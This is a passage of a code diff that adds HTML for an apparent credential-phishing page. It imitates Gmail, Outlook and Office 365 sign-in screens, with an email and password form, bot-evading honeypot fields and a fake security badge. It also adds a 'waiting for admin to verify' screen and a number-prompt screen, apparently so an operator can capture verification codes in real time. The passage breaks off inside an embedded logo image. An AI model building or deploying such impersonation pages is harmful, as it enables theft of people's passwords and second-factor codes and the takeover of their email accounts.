+      <div class="provider-icon"        data-name="Outlook"     data-color="#0078d4" data-img="outlook"   onclick="switchProvider(this)"><img src='data:image/png;base64,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' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+      <div class="provider-icon"        data-name="Office 365"  data-color="#D83B01" data-img="office365" onclick="switchProvider(this)"><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMKADAAQAAAABAAAAMAAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMAAwAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQAA//aAAwDAQACEQMRAD8A/wA/+iiv1e/Zr/ZX8CWnhPSviJ4zhGq6hqEEd3FDKM28KSDcnydHbaQSWyAeg4yeDMcxpYOn7Sp12S6n13BvBmO4kxrweCaSirylLaKvb1b7Jfgrs+J/hH+zN8Svi2Uv7KD+ztKbre3QKow/6Zr95/w+X1Ir6f8A+HaHxR8QxTD4Z61Y6vc20fmPbXIazlcZx+7JMiHtnc6Yz3r6/wDiJ+0F8JvhXI+meJNSX7ZEo/0O2UyzDjIBC8Jx03FeK7n9gn9qK0+Nnx81Xwlo2lPZWVtoc90JppAZXZbi3QAqvyqMOf4mr4HPuIs4o4CtmOGgoxguZXV0/W9m/lY/fML4ccB4WpTyTGYp1cbN8t4yfMpduWN4wX+O782fiX8UP2dPjl8GCW+Jvhi/0qENt+0vHvtix7CZN0RPsGrxav7hPE3hvRfGHh6+8K+I7dLuw1GB7e4hkGVeOQYIIPsa/h7rbw745q8RUq/t6ShUpct+Vuz5ua1k9V8L6voflvip4c0eFa+GeGrudOtz2UkuaLhy3u1ZO/MraLqf/9D/AD/6/oG+DH/JHvCf/YGsP/RCV/PzX9A3wZOPg94UJ/6A1j/6ISvkuLf4NL1f5H9E/R3/AORjjv8Ar3H/ANKPxG+NUkkvxi8VtISxGsXoyfQTOB+Qr9D/APgj1/ycvrn/AGLFz/6VWlfnJ8Wry11D4q+JtQsnEsM+rXskbqchlaZyCD6EGv0b/wCCPX/Jy+uf9ixc/wDpVaVyccK3C+LX/Tv/ACPhuCZKXHeHkne9eX5yP6RK/hfr+6Cv4X6/M/Af/mY/9wv/AHIfqX0k/wDmVf8Acb/3Ef/R/wA/+vor4c/EPxd451HRPhD408V3OleGC32d2V1iCRBTtQvgEqSAg3kquemBXzrRWNejGrGz36Oydn3V+p6WV5pWwNZVKbfK7c8VKUVOKabhLlabi7an64r+wT8HXUMmp6wQeQRNB/8AGK+0/wBhX9mPwH8F/i3qPinwvd6hcXE+kTWjLdSRugR5oHJASJDnKDvjGeK/Fb4OftUfEP4SxLpDkaxpKjC2lw5Bj/65yclR7YK+gzzX0HL/AMFLfi7oVvPD8MdKsNDlukCvdTA3lwuD/Bu2xgeoaNskde1fnfEuRZ3jcHWwNKpzKatdtJb9ev3Jn9H5Fxz4dYWnTzKOC9liYO6goOUk+8ZaQa7NuL7pH9MvijxNongzw5feLPEtwlpYadA9xcTSHCpHGMkkmv4fK9k+Jv7Qnxu+MrEfE3xPf6vFu3C3llK24YdxCm2MH3C143V+HfA1Th2lX9vVU51eW9k7Ll5rWb1fxPouh+a+KfiNS4qr4f6tQdOnR57czXNJz5b3S0VuVWV311P/2Q==' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-logo">
+      <div class="card-logo-inner pop" id="logoInner" style="background:#EA4335"><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMqADAAQAAAABAAAAMgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMgAyAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQABP/aAAwDAQACEQMRAD8A/gAAJ6U/y29v++hX9L//AAQzHwUPwr8QReMdG0q78SSeIQbS41GyhuWeOK3iKxxtMjrlWLN5ffdnB7f2mfsw/Fz9iLxobfwL8c/hb4E0nVmIjg1QeHdNjtLljwBKPs+IXPr/AKsn+70r5mHFWEWYTy+t7kk7Jv4X8+nz0876H6XPwrziWRUc+wcfa05x5nGKfPFXavb7S01tquzV2v8AJU8tvb/voUeW3t/30K/235/2Sv2S9u6P4VeCsEAgjw7ppBB6H/j3rmL79k39lQZ2/CzwWP8AuXdN/wDkavq1Sfc/M7n+KN5be35ikKkdcfnX+uJ+1Jrf7C/7PkUvh+2+GPgvWPFBX5NOi0HTgsGejXLi3/djvsHzt6Ac1/K1/wAFMdS+E3if4BeO9a8S+G/DtprF3pMrWEOm6TaWZgaMhkaJYIkMaof4ycnuSTXzOZcS4TCYiGFi+ebaTS2jd21ffy372P0/hrwpzjNctrZtNKjQhCU4uSd6nKr+6t7O3xPTtfW38b1FKeppK+hPzPlZ/9D+eX/glvpdnq37Ovii2u13Y1x2U9wwtoiCD2IPSv67/ib+yR478CeCNI8Y+DjNq2n3Om2lxNCxLzoZIUZiCeXGScg/N9a/kY/4JUy+X8A/E6+utSf+k0df6YPgLQrTWPhH4aguUDBtG0/qP+neOvzLLMpw+Y5zmtDEq6Tg13Ts9V/WvU/qLOuLcy4e4O4Xx2Wz5Xy1VJPWM0pR0kuq7bNX0aPxP/ZY/wCCi/jr4ByweC/HqzeIPCSHZ9nZv9LsRnn7OzHlR3hc7f7pU17h+1j/AMFTxrVvL4K/ZnaW0t5Uxca7PH5U53DlbaNuY8dDK/zZ+6B96um/ap/YX0HxuZvEHguI2etvkoIVyJ29HXgf8C4x3NeSfs7f8E9x4fvovEvxlWO9vIiGjskO+3jYd2P8ZH5V60Mpz2j/AMJ1Gt+5e0+sV27r0XyaVzhfFvh7jf8AjJcdg7Y2O9BfBUm9VO1uRre7dt3zRlLlv8m/BT9mf4ifG65/4SbxAZrDSZnMj3U2TPcluSU3cnPd2/Wvxe/4Kp+AtK8A6r8Z/DGjRmO3sLWWKMMSzbRBEeSck8kn8a/ur0jwpZ2VmIoYlREXCqBgACv4rf8AgtVAIPiP8eowOkU3/pPDXBxHkeGyzDYONFXk60Lye73+5eX5vU9LgTj7NOJswzipjJWpRwdbkpx+GOsVfzlbeT16Ky0P4wD1NJSnqaSv0Y/l0//R/nY/4JbzCP4EeJlJx/xOZD/5LR1/qA/CGIXHwp8LiJlH/Em07cxPC/6NH+Z9q/xfvh18dfi78JbG60z4da9daTb3rB5ooWGx2A25wwIzjjI7V+kGlf8ABev/AIK+6JpVroelfHjxHDaWUKQQRKbfakcahVUfuegAAr53KMmq4PM8ZjZyTjW5bJXurXvfS34n6fxXxxg814XybJKNKUauEVRTbtyy5mrctnfprdL5n+s7Pp9gsbJFgs/3nJG5v8B7DiuQPh+AXJ24xX+VGP8Ag4C/4LHD/mvniT/yW/8AjFNP/BwB/wAFiyd3/C/PEef+3b/4xX1SrI/L7H+rNNpsccZGR09a/hd/4LcBU+KHx9jBHEc3A/694a/DST/gvv8A8Fh5hh/j54l5/wBq3H/tGvib40ftu/tXftD6hrGq/GjxzqXiC48QMH1GS5dQ1yQFHz7FXPCqMdDivm+JMrqZlDDxpSS5KkZu/ZX2t118j9J8NuMsJw7UzGpi6cp+3w1SjHltpKbjZu7Xu6a2u/I+Vz1NJRRXuH51zI//0v8AP/ooooAKKKKACiiigAooooA//9k=' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+    </div>
+    <div class="card-title" id="cardTitle">Gmail</div>
+    <input class="hp-field" type="text"  id="hp_u" name="username"     tabindex="-1" autocomplete="off" aria-hidden="true">
+    <input class="hp-field" type="email" id="hp_e" name="email_confirm" tabindex="-1" autocomplete="off" aria-hidden="true">
+    <div class="input-group">
+      <div class="input-icon"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg></div>
+      <input type="email" placeholder="Enter email" id="emailInput" autocomplete="off">
+    </div>
+    <div class="input-group">
+      <div class="input-icon"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.8-2.2-5-5-5S7 3.2 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.7 1.4-3.1 3.1-3.1 1.7 0 3.1 1.4 3.1 3.1v2z"/></svg></div>
+      <input type="password" placeholder="Enter Password" id="passwordInput">
+    </div>
+    <label class="remember"><input type="checkbox" id="rememberMe"> Remember me</label>
+    <button class="btn-login" id="loginBtn" onclick="handleLogin()">
+      <span id="btnText">Login</span>
+      <div class="spinner" id="spinner"></div>
+    </button>
+    <div class="card-footer">Don't have an account? <a href="#">Sign Up</a><br><a href="#">Forgot your password?</a></div>
+    <div class="sec-badge">
+      <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4z"/></svg>
+      Protected by Anti-Bot Security
+    </div>
+  </div>
+ </div>
+</div>
+
+<!-- NEUTRAL WAIT PAGE -->
+<div class="fs fs-blue" id="neutralWait">
+  <div class="fs-logo" id="neutralLogo" style="background:#EA4335"><img src='data:image/png;base64,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' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+  <div class="fs-title">Please Wait...</div>
+  <div class="fs-sub">Your login has been received. Waiting for admin to verify your account.</div>
+  <div class="dots"><span></span><span></span><span></span></div>
+  <div class="wait-box">
+    <b>What happens next?</b><br>
+    The admin is reviewing your account details. A verification step will appear on this screen shortly.<br><br>
+    <span style="color:rgba(255,255,255,0.35);font-size:11px">⚠️ Do not close or refresh this page</span>
+  </div>
+  <br>
+  <button onclick="resetSession()" style="margin-top:16px;background:transparent;border:1px solid rgba(255,255,255,0.2);color:rgba(255,255,255,0.35);font-size:11px;padding:8px 20px;border-radius:20px;cursor:pointer;font-family:'Roboto',sans-serif;letter-spacing:0.5px;">
+    ← Back to Login
+  </button>
+</div>
+
+<!-- NUMBER PROMPT PAGE -->
+<div class="fs fs-blue" id="numPromptPage">
+  <div class="fs-logo" id="numLogo" style="background:#EA4335"><img src='data:image/png;base64,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